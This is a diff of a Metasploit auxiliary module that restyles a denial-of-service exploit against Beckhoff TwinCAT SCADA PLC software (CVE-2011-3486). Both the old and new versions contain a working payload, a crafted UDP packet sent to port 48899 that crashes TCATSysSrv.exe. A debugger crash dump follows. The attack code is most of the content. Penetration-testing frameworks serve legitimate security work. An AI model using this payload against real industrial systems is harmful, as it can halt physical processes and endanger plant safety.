@@ -1,54 +1,44 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Udp
+  include Msf::Auxiliary::Dos
 
-require 'msf/core'
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Beckhoff TwinCAT SCADA PLC 2.11.0.2004 DoS',
+      'Description'    => %q{
+        The Beckhoff TwinCAT version <= 2.11.0.2004 can be brought down by sending
+        a crafted UDP packet to port 48899 (TCATSysSrv.exe).
+      },
+      'Author'         =>
+        [
+          'Luigi Auriemma', # Public exploit
+          'jfa',            # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2011-3486' ],
+          [ 'OSVDB', '75495' ],
+          [ 'URL', 'http://aluigi.altervista.org/adv/twincat_1-adv.txt' ]
+        ],
+      'DisclosureDate' => 'Sep 13 2011'
+    ))
 
-class Metasploit3 < Msf::Auxiliary
+    register_options([Opt::RPORT(48899)])
+  end
 
-	include Msf::Exploit::Remote::Udp
-	include Msf::Auxiliary::Dos
-
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Beckhoff TwinCAT SCADA PLC 2.11.0.2004 DoS',
-			'Description'    => %q{
-				The Beckhoff TwinCAT version <= 2.11.0.2004 can be brought down by sending
-				a crafted UDP packet to port 48899 (TCATSysSrv.exe).
-			},
-			'Author'         =>
-				[
-					'Luigi Auriemma', # Public exploit
-					'jfa',            # Metasploit module
-				],
-			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$',
-			'References'     =>
-				[
-					[ 'CVE', '2011-3486' ],
-					[ 'OSVDB', '75495' ],
-					[ 'URL', 'http://aluigi.altervista.org/adv/twincat_1-adv.txt' ]
-				],
-			'DisclosureDate' => 'Sep 13 2011'
-		))
-
-		register_options([Opt::RPORT(48899)])
-	end
-
-	def run
-		dos = "\x03\x66\x14\x71" + "\x00"*16 + "\xff"*1514
-		connect_udp
-		print_status("Sending DoS packet ...")
-		udp_sock.put(dos)
-		disconnect_udp
-	end
+  def run
+    dos = "\x03\x66\x14\x71" + "\x00"*16 + "\xff"*1514
+    connect_udp
+    print_status("Sending DoS packet ...")
+    udp_sock.put(dos)
+    disconnect_udp
+  end
 end
 
 =begin
@@ -63,7 +53,7 @@ cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010213
 TCATSysSrv+0x14f6a:
 00414f6a 66833802        cmp     word ptr [eax],2         ds:0023:02a1f9cf=????
 0:016> k
-ChildEBP RetAddr  
+ChildEBP RetAddr
 WARNING: Stack unwind information not available. Following frames may be wrong.
 02a0f7f8 71ab265b TCATSysSrv+0x14f6a
 02a0f80c 71ab4a9e WS2_32!Prolog_v1+0x21
